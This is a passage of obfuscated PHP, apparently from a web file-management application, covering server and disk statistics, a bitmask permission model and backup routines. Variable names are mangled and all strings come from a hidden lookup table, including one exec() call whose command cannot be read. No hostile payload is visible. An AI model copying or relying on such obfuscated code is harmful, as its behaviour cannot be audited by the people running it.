array($Åù‚ëÓ»[822] => $this->typeLogCnt(), $Åù‚ëÓ»[110] => $this->typeLogCnt($Åù‚ëÓ»[110]), $Åù‚ëÓ»[534] => $this->typeLogCnt($Åù‚ëÓ»[534]), $Åù‚ëÓ»[1922] => $this->typeLogCnt($Åù‚ëÓ»[1922]), $Åù‚ëÓ»[1923] => $this->typeLogCnt($Åù‚ëÓ»[1923]), $Åù‚ëÓ»[671] => $this->typeLogCnt($Åù‚ëÓ»[12], $Åù‚ëÓ»[1898])); } private function typeLogCnt($î…Îó© = '', $®¬¿œá = "\x69\144") { $ÂÚŒª¶ =& $_SERVER[£ğ°ÖØø]; $ÙÄàí„ = array($ÂÚŒª¶[110] => array($ÂÚŒª¶[1924], $ÂÚŒª¶[1925]), $ÂÚŒª¶[534] => array($ÂÚŒª¶[1926], $ÂÚŒª¶[1927]), $ÂÚŒª¶[1922] => array($ÂÚŒª¶[1928], $ÂÚŒª¶[1929], $ÂÚŒª¶[1930]), $ÂÚŒª¶[1923] => array($ÂÚŒª¶[1931], $ÂÚŒª¶[1932]), $ÂÚŒª¶[1933] => array($ÂÚŒª¶[1934], $ÂÚŒª¶[1935], $ÂÚŒª¶[1936])); $œø²‹§á = strtotime(date($ÂÚŒª¶[1894])); $¥ÕÌ½üş = array($ÂÚŒª¶[231] => array($ÂÚŒª¶[1075], $œø²‹§á)); if ($î…Îó©) { $¥ÕÌ½üş[$ÂÚŒª¶[33]] = array($ÂÚŒª¶[7], $ÙÄàí„[$î…Îó©]); } $ìøæšŞº = Model($ÂÚŒª¶[1897])->where($¥ÕÌ½üş)->count($®¬¿œá); return (int) $ìøæšŞº; } private function optionServer() { $ô‡Ñ¾¬í =& $_SERVER[£ğ°ÖØø]; $”ìà¢’ë = $this->diskDriver(); $š–º³÷› = KodIO::defaultDriver(); $Ôı¡àØ­ = array($ô‡Ñ¾¬í[881] => $š–º³÷›[$ô‡Ñ¾¬í[484]]); $¼¯­éè± = Model($ô‡Ñ¾¬í[553])->where($Ôı¡àØ­)->sum($ô‡Ñ¾¬í[79]); $ë¹„š« = explode($ô‡Ñ¾¬í[53], $_SERVER[$ô‡Ñ¾¬í[147]]); $ÁÕÎğí¡ = $ë¹„š«[0]; $¡Ğ½Ì° = $GLOBALS[$ô‡Ñ¾¬í[6]][$ô‡Ñ¾¬í[21]]; $ä¶÷Ù©Ù = $¡Ğ½Ì°[$ô‡Ñ¾¬í[1037]]; if ($ä¶÷Ù©Ù == $ô‡Ñ¾¬í[1025]) { $İÕ°à˜ş = explode($ô‡Ñ¾¬í[1351], $¡Ğ½Ì°[$ô‡Ñ¾¬í[1036]]); $ä¶÷Ù©Ù = $İÕ°à˜ş[0]; } if ($ä¶÷Ù©Ù == $ô‡Ñ¾¬í[973] || $ä¶÷Ù©Ù == $ô‡Ñ¾¬í[868]) { $ˆáö§­ò = Model()->db()->query($ô‡Ñ¾¬í[1937]); $™îèá²‡ = $ˆáö§­ò[0] && isset($ˆáö§­ò[0][$ô‡Ñ¾¬í[1641]]) ? $ˆáö§­ò[0][$ô‡Ñ¾¬í[1641]] : 0; $ä¶÷Ù©Ù = $ô‡Ñ¾¬í[1938] . ($™îèá²‡ ? $ô‡Ñ¾¬í[8] . $™îèá²‡ : $ô‡Ñ¾¬í[12]); } $›ŒàÄÔ½ = $GLOBALS[$ô‡Ñ¾¬í[6]][$ô‡Ñ¾¬í[425]][$ô‡Ñ¾¬í[890]]; return array($ô‡Ñ¾¬í[1939] => $”ìà¢’ë ? $”ìà¢’ë[$ô‡Ñ¾¬í[1940]] : 0, $ô‡Ñ¾¬í[1941] => $”ìà¢’ë ? $”ìà¢’ë[$ô‡Ñ¾¬í[1942]] : 0, $ô‡Ñ¾¬í[1943] => (int) $š–º³÷›[$ô‡Ñ¾¬í[1940]] * 1024 * 1024 * 1024, $ô‡Ñ¾¬í[1944] => (int) $¼¯­éè±, $ô‡Ñ¾¬í[1945] => ucfirst($ÁÕÎğí¡), $ô‡Ñ¾¬í[1946] => $ô‡Ñ¾¬í[1947] . PHP_VERSION, $ô‡Ñ¾¬í[1948] => phpBuild64() ? 64 : 32, $ô‡Ñ¾¬í[821] => str_replace($ô‡Ñ¾¬í[1194], $ô‡Ñ¾¬í[1053], $ä¶÷Ù©Ù), $ô‡Ñ¾¬í[425] => ucfirst($›ŒàÄÔ½), $ô‡Ñ¾¬í[32] => $_SERVER[$ô‡Ñ¾¬í[1949]]); } private function diskDriver() { $â÷ƒŒ™ö =& $_SERVER[£ğ°ÖØø]; $Ğ¸®œÚÒ = $â÷ƒŒ™ö[8]; $Ë°Í…¶Ş = $GLOBALS[$â÷ƒŒ™ö[6]][$â÷ƒŒ™ö[1368]] == $â÷ƒŒ™ö[1369]; if ($Ë°Í…¶Ş) { $Ğ¸®œÚÒ = $â÷ƒŒ™ö[1950]; if (function_exists($â÷ƒŒ™ö[1951])) { exec($â÷ƒŒ™ö[1952], $µı¶­À); $Ğ¸®œÚÒ = $µı¶­À[1] . $â÷ƒŒ™ö[8]; } } if (!file_exists($Ğ¸®œÚÒ)) { return; } if (!function_exists($â÷ƒŒ™ö[1953])) { return; } $Š¿œˆîß = @disk_total_space($Ğ¸®œÚÒ); $äßóü”ã = $Š¿œˆîß - @disk_free_space($Ğ¸®œÚÒ); return array($â÷ƒŒ™ö[1940] => $Š¿œˆîß, $â÷ƒŒ™ö[1942] => $äßóü”ã); } public function fileChart($İºŠò µ) { $à‰—óº„ =& $_SERVER[£ğ°ÖØø]; if (isset($İºŠò µ[$à‰—óº„[1755]])) { return Model($à‰—óº„[888])->userFileTypeProfile($İºŠò µ[$à‰—óº„[1755]]); } if (isset($İºŠò µ[$à‰—óº„[1954]])) { return Model($à‰—óº„[888])->groupFileTypeProfile($İºŠò µ[$à‰—óº„[1954]]); } $ÖõŞÜÏ = $this->sourceSize(); $é‘±ˆ¯ = array($à‰—óº„[192] => 0, $à‰—óº„[190] => 1); $äáÆîİÔ = Model($à‰—óº„[888])->where($é‘±ˆ¯)->sum($à‰—óº„[79]); $é‘±ˆ¯[$à‰—óº„[190]] = 2; $¹ôÔ„Õ­ = Model($à‰—óº„[888])->where($é‘±ˆ¯)->sum($à‰—óº„[79]); return array($à‰—óº„[827] => $ÖõŞÜÏ[$à‰—óº„[79]], $à‰—óº„[1887] => $ÖõŞÜÏ[$à‰—óº„[1887]], $à‰—óº„[1888] => (int) $äáÆîİÔ, $à‰—óº„[1889] => (int) $¹ôÔ„Õ­); } private function sourceSize() { $¦œš‹¢ =& $_SERVER[£ğ°ÖØø]; $‡š»ñ = Model($¦œš‹¢[888])->where(array($¦œš‹¢[494] => 0))->sum($¦œš‹¢[79]); $£’ºı½ = Model($¦œš‹¢[553])->sum($¦œš‹¢[79]); if ($£’ºı½ > $‡š»ñ) { $£’ºı½ = $‡š»ñ; } return array($¦œš‹¢[79] => (int) $‡š»ñ, $¦œš‹¢[1887] => (int) $£’ºı½); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ª‡æâÃÙ =& $_SERVER[£ğ°ÖØø]; $²Ó„ˆŒ = array(array($ª‡æâÃÙ[503] => LNG($ª‡æâÃÙ[1955]), $ª‡æâÃÙ[1956] => $ª‡æâÃÙ[1957], $ª‡æâÃÙ[1958] => 1, $ª‡æâÃÙ[1959] => 1, $ª‡æâÃÙ[1960] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ª‡æâÃÙ[503] => LNG($ª‡æâÃÙ[1961]), $ª‡æâÃÙ[1956] => $ª‡æâÃÙ[1962], $ª‡æâÃÙ[1958] => 2, $ª‡æâÃÙ[1959] => 1, $ª‡æâÃÙ[1960] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ª‡æâÃÙ[503] => LNG($ª‡æâÃÙ[1963]), $ª‡æâÃÙ[1956] => $ª‡æâÃÙ[1964], $ª‡æâÃÙ[1958] => 3, $ª‡æâÃÙ[1959] => 1, $ª‡æâÃÙ[1960] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ª‡æâÃÙ[503] => LNG($ª‡æâÃÙ[1965]), $ª‡æâÃÙ[1956] => $ª‡æâÃÙ[1966], $ª‡æâÃÙ[1958] => 4, $ª‡æâÃÙ[1959] => 1, $ª‡æâÃÙ[1960] => self::AUTH_SHOW | self::AUTH_VIEW), array($ª‡æâÃÙ[503] => LNG($ª‡æâÃÙ[1967]), $ª‡æâÃÙ[1956] => $ª‡æâÃÙ[1968], $ª‡æâÃÙ[1958] => 5, $ª‡æâÃÙ[1959] => 1, $ª‡æâÃÙ[1960] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ª‡æâÃÙ[503] => LNG($ª‡æâÃÙ[1969]), $ª‡æâÃÙ[1956] => $ª‡æâÃÙ[1970], $ª‡æâÃÙ[1958] => 6, $ª‡æâÃÙ[1959] => 1, $ª‡æâÃÙ[1960] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ª‡æâÃÙ[503] => LNG($ª‡æâÃÙ[1971]), $ª‡æâÃÙ[1956] => $ª‡æâÃÙ[1972], $ª‡æâÃÙ[1958] => 7, $ª‡æâÃÙ[1959] => 1, $ª‡æâÃÙ[1960] => 0)); return $²Ó„ˆŒ; } public static function authCheck($Œ·û½›ò, $¬“Ê…º·) { $ò˜«ßš  =& $_SERVER[£ğ°ÖØø]; $Œ·û½›ò = intval($Œ·û½›ò); if (KodUser::isRoot() && $GLOBALS[$ò˜«ßš [6]][$ò˜«ßš [1973]]) { return !0; } if ($Œ·û½›ò <= 0) { return !1; } if (($Œ·û½›ò & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Œ·û½›ò & $¬“Ê…º·); } public static function authCheckShow($¶±÷¯Í¥) { return self::authCheck($¶±÷¯Í¥, self::AUTH_SHOW); } public static function authCheckView($¢åñ¨¥) { return self::authCheck($¢åñ¨¥, self::AUTH_VIEW); } public static function authCheckDownload($ÉÔÄÍÕĞ) { return self::authCheck($ÉÔÄÍÕĞ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ó×ä¹Æ) { return self::authCheck($ó×ä¹Æ, self::AUTH_UPLOAD); } public static function authCheckEdit($·¸¿éÊŸ) { return self::authCheck($·¸¿éÊŸ, self::AUTH_EDIT); } public static function authCheckRemove($À©Œ…ô­) { return self::authCheck($À©Œ…ô­, self::AUTH_REMOVE); } public static function authCheckShare($éêµñº) { return self::authCheck($éêµñº, self::AUTH_SHARE); } public static function authCheckComment($½øÉ¾ù) { return self::authCheck($½øÉ¾ù, self::AUTH_COMMENT); } public static function authCheckEvent($Éãı³ú) { return self::authCheck($Éãı³ú, self::AUTH_EVENT); } public static function authCheckRoot($¤Ùø„Š’) { return self::authCheck($¤Ùø„Š’, self::AUTH_ROOT); } public static function authCheckAction($ÔæœÏÆã, $Ş…¤à‚Œ) { $É®ãÕ˜² =& $_SERVER[£ğ°ÖØø]; $Û›–ş­„ = array($É®ãÕ˜²[1974] => self::AUTH_VIEW, $É®ãÕ˜²[1262] => self::AUTH_DOWNLOAD, $É®ãÕ˜²[110] => self::AUTH_UPLOAD, $É®ãÕ˜²[1923] => self::AUTH_EDIT, $É®ãÕ˜²[1922] => self::AUTH_REMOVE, $É®ãÕ˜²[1933] => self::AUTH_SHARE, $É®ãÕ˜²[430] => self::AUTH_COMMENT, $É®ãÕ˜²[1743] => self::AUTH_EVENT, $É®ãÕ˜²[1975] => self::AUTH_ROOT); if (!isset($Û›–ş­„[$Ş…¤à‚Œ])) { return; } $Æ´‹İèñ = $Û›–ş­„[$Ş…¤à‚Œ]; $ÔæœÏÆã = intval($ÔæœÏÆã); if ($ÔæœÏÆã <= 0) { return !1; } if (($ÔæœÏÆã & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÔæœÏÆã & $Æ´‹İèñ); } public static function authDisable($éßİÕ´š, $»ÄÎû›Ó) { if (intval($éßİÕ´š) <= 0) { return 0; } return intval($éßİÕ´š) & ~$»ÄÎû›Ó; } public $optionType = "\x53\171\163\164\x65\155\x2e\163\157\x75\162\143\145\x41\165\164\x68\114\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\141\165\164\x68", "\154\141\x62\x65\154", "\x64\151\163\160\154\141\x79", "\163\171\163\x74\x65\x6d", "\163\x6f\162\x74"); public function initData() { $Ÿ¤¥Úş× = $this->authDefault(); foreach ($Ÿ¤¥Úş× as $ó€‡ùÓù) { $this->add($ó€‡ùÓù); } } public function findAuth($©ÀÃ·ã, $Õ·¬åÓ) { $ ·¶ÀÔ =& $_SERVER[£ğ°ÖØø]; $¤ášÄ¼æ = parent::listData(); foreach ($¤ášÄ¼æ as $½¦ÚãıÌ) { $©ßÈö³ = intval($½¦ÚãıÌ[$ ·¶ÀÔ[496]]); if ($©ßÈö³ <= 0 || $½¦ÚãıÌ[$ ·¶ÀÔ[1976]] == 0) { continue; } if (($©ßÈö³ & $©ÀÃ·ã) != $©ÀÃ·ã) { continue; } if (($©ßÈö³ & $Õ·¬åÓ) != 0) { continue; } return $½¦ÚãıÌ[$ ·¶ÀÔ[484]]; } return !1; } public function findAuthReadOnly() { $íÃĞÄÅ” = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $„œ“è” = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($íÃĞÄÅ”, $„œ“è”); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $²û½Æí´ =& $_SERVER[£ğ°ÖØø]; $¨ğı•î´ = parent::listData(); $¨–ëÇ³ = !1; foreach ($¨ğı•î´ as $İÚÄú‰Ö) { if ($İÚÄú‰Ö[$²û½Æí´[496]] <= 0 || $İÚÄú‰Ö[$²û½Æí´[1976]] == $²û½Æí´[228]) { continue; } if (!$¨–ëÇ³) { $¨–ëÇ³ = $İÚÄú‰Ö; continue; } if ($¨–ëÇ³[$²û½Æí´[496]] > $İÚÄú‰Ö[$²û½Æí´[496]]) { $¨–ëÇ³ = $İÚÄú‰Ö; } } return $¨–ëÇ³ ? $¨–ëÇ³[$²û½Æí´[484]] : $²û½Æí´[12]; } public function listData($éšÚÒıâ = false, $š†Âšûå = "\x73\157\162\164", $™†ªª›Ç = false) { return parent::listData($éšÚÒıâ, $š†Âšûå, $™†ªª›Ç); } public function update($Û¦…Åîƒ, $Åƒµ¤Åø) { $ù¡×¹æ™ =& $_SERVER[£ğ°ÖØø]; $ÅâÚàè‰ = parent::listData($Û¦…Åîƒ); $ï§øïÌ­ = $this->findByName($Åƒµ¤Åø[$ù¡×¹æ™[32]]); if (!$ÅâÚàè‰ || $ï§øïÌ­ && $ï§øïÌ­[$ù¡×¹æ™[484]] != $ÅâÚàè‰[$ù¡×¹æ™[484]]) { return !1; } $this->filterAuth($Åƒµ¤Åø[$ù¡×¹æ™[496]]); return parent::update($Û¦…Åîƒ, $Åƒµ¤Åø); } public function remove($˜éšâ¼ğ) { $ì£ µŞ = parent::listData($˜éšâ¼ğ); if (!$ì£ µŞ || $ì£ µŞ[$_SERVER[£ğ°ÖØø][191]]) { return !1; } return parent::remove($˜éšâ¼ğ); } public function add($ìƒ°¿ƒ = array()) { $íœ‡ıÛì =& $_SERVER[£ğ°ÖØø]; if ($this->findByName($ìƒ°¿ƒ[$íœ‡ıÛì[32]])) { return !1; } $³ÊÙ”ä‚ = array($íœ‡ıÛì[32] => $íœ‡ıÛì[12], $íœ‡ıÛì[496] => 1, $íœ‡ıÛì[1977] => $íœ‡ıÛì[1964], $íœ‡ıÛì[1976] => 1, $íœ‡ıÛì[191] => 0, $íœ‡ıÛì[1978] => 0); $ìƒ°¿ƒ = array_merge($³ÊÙ”ä‚, $ìƒ°¿ƒ); $ìƒ°¿ƒ[$íœ‡ıÛì[1978]] = $this->getSort(); $this->filterAuth($ìƒ°¿ƒ[$íœ‡ıÛì[496]]); return parent::insert($ìƒ°¿ƒ); } private function getSort() { $±ğâ¢Øõ =& $_SERVER[£ğ°ÖØø]; $Éª¦‹‰ = parent::listData(); $’Ü·É³æ = array_to_keyvalue($Éª¦‹‰, $±ğâ¢Øõ[12], $±ğâ¢Øõ[1978]); return empty($’Ü·É³æ) ? 0 : max($’Ü·É³æ) + 1; } private function filterAuth(&$òØ½”Ã“) { if (!$òØ½”Ã“) { return; } $ô¤Ø¾è¦ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ˆ”±ßûí = array(); foreach ($ô¤Ø¾è¦ as $öÅ”î›À) { if ($òØ½”Ã“ & $öÅ”î›À) { $ˆ”±ßûí[] = $öÅ”î›À; } } if (in_array(self::AUTH_ROOT, $ˆ”±ßûí)) { $òØ½”Ã“ = array_sum($ô¤Ø¾è¦); return; } $À³÷©Ê = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ˆ”±ßûí as $öÅ”î›À) { if (isset($À³÷©Ê[$öÅ”î›À])) { $ˆ”±ßûí = array_merge($ˆ”±ßûí, $À³÷©Ê[$öÅ”î›À]); } } $ˆ”±ßûí[] = self::AUTH_SHOW; $òØ½”Ã“ = array_sum(array_unique($ˆ”±ßûí)); } public function sort($Ä©ËñÜ¢, $âÓ£Øê) { return parent::update($Ä©ËñÜ¢, $âÓ£Øê); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\142\x61\143\x6b\x75\160\114\151\163\164"; public $field = array("\x69\x6f", "\156\141\x6d\145", "\163\164\141\x74\x75\163", "\143\x6f\x6e\x74\145\x6e\x74", "\x6d\141\x6e\165\x61\x6c", "\162\145\163\x75\154\164", "\164\x69\155\x65\x46\x72\157\x6d", "\x74\x69\155\x65\x54\x6f"); public function config() { $××‰Ï =& $_SERVER[£ğ°ÖØø]; Action($××‰Ï[1979])->taskInit(); $€ºÍ¥Àî = Model($××‰Ï[834])->get($××‰Ï[847]); $€ºÍ¥Àî = json_decode($€ºÍ¥Àî, !0); $€ºÍ¥Àî = is_array($€ºÍ¥Àî) ? $€ºÍ¥Àî : array(); $this->parseContent($€ºÍ¥Àî); unset($€ºÍ¥Àî[$××‰Ï[1725]]); Model($××‰Ï[1724])->cacheClear(); $İÒŒùÈ = $××‰Ï[1980]; $Æ·«ä®İ = Model($××‰Ï[1981])->findByKey($××‰Ï[1743], $İÒŒùÈ); if (!$Æ·«ä®İ) { $Æ·«ä®İ = array(); } if (isset($Æ·«ä®İ[$××‰Ï[206]])) { $Æ·«ä®İ[$××‰Ï[206]] = json_decode($Æ·«ä®İ[$××‰Ï[206]], !0); } if (isset($€ºÍ¥Àî[$××‰Ï[206]])) { $Æ·«ä®İ[$××‰Ï[206]][$××‰Ï[1728]] = $€ºÍ¥Àî[$××‰Ï[206]]; unset($€ºÍ¥Àî[$××‰Ï[206]]); } return array_merge($Æ·«ä®İ, $€ºÍ¥Àî); } public function listData($¨ÎÒÎäÊ = false, $…ó¿ŸóÒ = "\x6d\157\144\x69\146\x79\x54\151\155\145", $Áô’ı±¬ = false) { $í®¤ÆÁ† = parent::listData($¨ÎÒÎäÊ, $…ó¿ŸóÒ, !0); if (!$í®¤ÆÁ†) { return $í®¤ÆÁ†; } if ($¨ÎÒÎäÊ) { $í®¤ÆÁ† = array($í®¤ÆÁ†); } foreach ($í®¤ÆÁ† as &$û˜îõ˜Ò) { $this->parseContent($û˜îõ˜Ò); } return $¨ÎÒÎäÊ ? $í®¤ÆÁ†[0] : $í®¤ÆÁ†; } public function parseContent(&$ãÀŠ·şò) { $Ğ×™¥İî =& $_SERVER[£ğ°ÖØø]; $÷€·Œ«‰ = _get($ãÀŠ·şò, $Ğ×™¥İî[171], $Ğ×™¥İî[91]); if (!in_array($÷€·Œ«‰, array($Ğ×™¥İî[840], $Ğ×™¥İî[1194]))) { $ãÀŠ·şò[$Ğ×™¥İî[171]] = $÷€·Œ«‰ == $Ğ×™¥İî[91] ? $Ğ×™¥İî[1194] : $Ğ×™¥İî[840]; } } public function lastItem() { $ÜÚßœÕŸ = $this->listData(); return !empty($ÜÚßœÕŸ[0]) ? $ÜÚßœÕŸ[0] : null; } public function kill($ŸËÜë¯¬) { $“‡Š›Ø” =& $_SERVER[£ğ°ÖØø]; $‚µ „Œğ = $this->listData($ŸËÜë¯¬); if (!$‚µ „Œğ || empty($‚µ „Œğ[$“‡Š›Ø”[32]])) { return !0; } Task::kill($“‡Š›Ø”[846]); Task::kill($“‡Š›Ø”[864]); Task::kill($“‡Š›Ø”[873]); $ñÛ…¡Â = $‚µ „Œğ[$“‡Š›Ø”[32]]; $‰•¢ ‰µ = TEMP_FILES . $“‡Š›Ø”[843] . $ñÛ…¡Â . $“‡Š›Ø”[8]; IO::remove($‰•¢ ‰µ, !1); return $this->remove($ŸËÜë¯¬); } public function remove($Ìú…ƒÃ‡) { $Ì˜™Ù”ë = $this->listData($Ìú…ƒÃ‡); if (!$Ì˜™Ù”ë) { return !0; } return $this->backupRemove($Ì˜™Ù”ë); } private function backupRemove($üæíæ¸¸) { parent::remove($üæíæ¸¸[$_SERVER[£ğ°ÖØø][484]]); $ºçêĞğŸ = $this->backupPath($üæíæ¸¸); IO::remove($ºçêĞğŸ, !1); return !0; } private function backupPath($È…¼ş) { $¢«¡†Æ« =& $_SERVER[£ğ°ÖØø]; $û¤¯Àä€ = $È…¼ş[$¢«¡†Æ«[32]]; $é³£«Ç = Model($¢«¡†Æ«[834])->get($¢«¡†Æ«[835]); $¶·²÷îÃ = substr(md5($¢«¡†Æ«[836] . $é³£«Ç . $û¤¯Àä€), 0, 8); return "\x7b\151\x6f\72{$È…¼ş[$¢«¡†Æ«[816]]}\175\57\x64\x61\164\x61\x62\141\x73\145\x2f\x62\x61\x63\153\x75\x70\x2f" . $û¤¯Àä€ . $¢«¡†Æ«[11] . $¶·²÷îÃ; } public function start() { $ãº‹­æ =& $_SERVER[£ğ°ÖØø]; if ($GLOBALS[$ãº‹­æ[6]][$ãº‹­æ[92]][$ãº‹­æ[1982]] != $ãº‹­æ[91]) { return !0; } $İııı¾Ù = $this->config(); if (!$İııı¾Ù || $İııı¾Ù[$ãº‹­æ[1725]] != $ãº‹­æ[91]) { return !1; } if ($İııı¾Ù[$ãº‹­æ[171]] == $ãº‹­æ[840]) { $äõ÷üèİ = Model($ãº‹­æ[834])->get($ãº‹­æ[1307]); if ($äõ÷üèİ == $ãº‹­æ[1308]) { $İııı¾Ù[$ãº‹­æ[171]] = $ãº‹­æ[1194]; } } $œÕà“å¿ = $this->process(); foreach ($œÕà“å¿ as $òéòƒ“Ì) { if ($òéòƒ“Ì) { return Task::restart($òéòƒ“Ì[$ãº‹­æ[484]]); } } $¨ï¿„Œå = new Backup(); $‹¥°ÊıÒ = $¨ï¿„Œå->db(); if ($‹¥°ÊıÒ) { $‹¥°ÊıÒ = $¨ï¿„Œå->dbFile(); if ($‹¥°ÊıÒ && $İııı¾Ù[$ãº‹­æ[171]] == $ãº‹­æ[840]) { $‹¥°ÊıÒ = $¨ï¿„Œå->file(); } } Backup::set(array($ãº‹­æ[814] => 1, $ãº‹­æ[825] => time())); return !0; } public function process() { $š‰¿Ø¤ =& $_SERVER[£ğ°ÖØø]; $¯´èªßˆ = array($š‰¿Ø¤[821] => Task::get($š‰¿Ø¤[846]), $š‰¿Ø¤[826] => Task::get($š‰¿Ø¤[864]), $š‰¿Ø¤[230] => Task::get($š‰¿Ø¤[873])); $§ß’ì°í = !1; foreach ($¯´èªßˆ as &$ÂÂƒö»¸) { if ($§ß’ì°í) { $ÂÂƒö»¸ = !1; continue; } if ($ÂÂƒö»¸) { $€‚®×Ùû = intval(_get($ÂÂƒö»¸, $š‰¿Ø¤[1760], 0)); if (time() - $€‚®×Ùû > 7200) { Task::kill($ÂÂƒö»¸[$š‰¿Ø¤[484]]); $§ß’ì°í = !0; $ÂÂƒö»¸ = !1; } } } return $¯´èªßˆ; } public function restore() { $Ô¿“ŞØ =& $_SERVER[£ğ°ÖØø]; ActionCall($Ô¿“ŞØ[1121], !0, 1); ActionCall($Ô¿“ŞØ[1121], !0, 0); } } goto d—ËÖŠËÖâ; a•ŸäãÆâ: class BackupFile { public function __construct() { } public function index() { $ñÓ²«Ø¿ = Backup::get(); $ğ‚îãÀ¥ = $ñÓ²«Ø¿[$_SERVER[£ğ°ÖØø][369]][$_SERVER[£ğ°ÖØø][230]][$_SERVER[£ğ°ÖØø][550]]; $âğâ¯šĞ = array($_SERVER[£ğ°ÖØø][551] => array($_SERVER[£ğ°ÖØø][871], $ğ‚îãÀ¥), $_SERVER[£ğ°ÖØø][872] => array($_SERVER[£ğ°ÖØø][407], $ñÓ²«Ø¿[$_SERVER[£ğ°ÖØø][816]])); $ªÀì…ı = (int) Model($_SERVER[£ğ°ÖØø][853])->where($âğâ¯šĞ)->count($_SERVER[£ğ°ÖØø][550]); $Ğ‘ª »‘ = (int) Model($_SERVER[£ğ°ÖØø][853])->where($âğâ¯šĞ)->sum($_SERVER[£ğ°ÖØø][79]); $¢„“à«¶ = new TaskFileTransfer($_SERVER[£ğ°ÖØø][873], $_SERVER[£ğ°ÖØø][847], $ªÀì…ı, LNG($_SERVER[£ğ°ÖØø][848]) . $_SERVER[£ğ°ÖØø][849] . LNG($_SERVER[£ğ°ÖØø][874])); $¢„“à«¶->task[$_SERVER[£ğ°ÖØø][827]] = $Ğ‘ª »‘; $°ùÊ•Û´ = array($_SERVER[£ğ°ÖØø][875] => $ªÀì…ı, $_SERVER[£ğ°ÖØø][876] => $Ğ‘ª »‘, $_SERVER[£ğ°ÖØø][877] => time()); Backup::set($°ùÊ•Û´); $‹÷Õš˜Õ = !0; $İ¹Ô¼ù  = $this->storeIds(); $ƒó€Õ = 1; $½ãÜÅ²ü = 1000; $ˆ½À™„ = $¡ÒŞ×ì† = 0; $åˆ¢®­ = array(); $ä×ó†¼„ = $Ğ°Õ—Ãì = 0; do { $€«†–şÉ = $_SERVER[£ğ°ÖØø][878]; $è¤‘Á›  = Model($_SERVER[£ğ°ÖØø][853])->where($âğâ¯šĞ)->field($€«†–şÉ)->order($_SERVER[£ğ°ÖØø][879])->selectPage($½ãÜÅ²ü, $ƒó€Õ); $³ïÏƒé = !empty($è¤‘Á› [$_SERVER[£ğ°ÖØø][454]]) ? $è¤‘Á› [$_SERVER[£ğ°ÖØø][454]] : array(); foreach ($³ïÏƒé as $ËºêÇó) { if (!$this->_fileExist($ËºêÇó, $åˆ¢®­, $İ¹Ô¼ù )) { write_log("\146\151\154\x65\x20\156\x6f\164\x20\145\x78\151\x73\164\56\146\151\154\x65\111\104\72{$ËºêÇó[$_SERVER[£ğ°ÖØø][550]]}\54\x20\160\141\164\150\72{$ËºêÇó[$_SERVER[£ğ°ÖØø][87]]}", $_SERVER[£ğ°ÖØø][880]); continue; } $¶à¼Ä×è = $ËºêÇó[$_SERVER[£ğ°ÖØø][87]]; $šæáÃ = "\173\151\x6f\72{$ñÓ²«Ø¿[$_SERVER[£ğ°ÖØø][816]]}\175" . substr($¶à¼Ä×è, strlen("\x7b\151\x6f\x3a{$ËºêÇó[$_SERVER[£ğ°ÖØø][881]]}\x7d")); if (IO::exist($šæáÃ)) { $¢„“à«¶->updateFileEnd($ËºêÇó[$_SERVER[£ğ°ÖØø][32]], $ËºêÇó[$_SERVER[£ğ°ÖØø][79]]); } else { $šæáÃ = get_path_father($šæáÃ); IO::mkdir($šæáÃ); if (!IO::copy($¶à¼Ä×è, $šæáÃ, $_SERVER[£ğ°ÖØø][882])) { write_log($_SERVER[£ğ°ÖØø][883] . $¶à¼Ä×è . $_SERVER[£ğ°ÖØø][867] . $šæáÃ . $_SERVER[£ğ°ÖØø][178], $_SERVER[£ğ°ÖØø][847]); $‹÷Õš˜Õ = !1; break; } } $ğ‚îãÀ¥ = $ËºêÇó[$_SERVER[£ğ°ÖØø][550]]; $¡ÒŞ×ì† += 1; $ˆ½À™„ += $ËºêÇó[$_SERVER[£ğ°ÖØø][79]]; $Ğ°Õ—Ãì += 1; $ä×ó†¼„ += $ËºêÇó[$_SERVER[£ğ°ÖØø][79]]; if ($ˆ½À™„ >= 1024 * 1024 * 100) { $°ùÊ•Û´ = array($_SERVER[£ğ°ÖØø][815] => 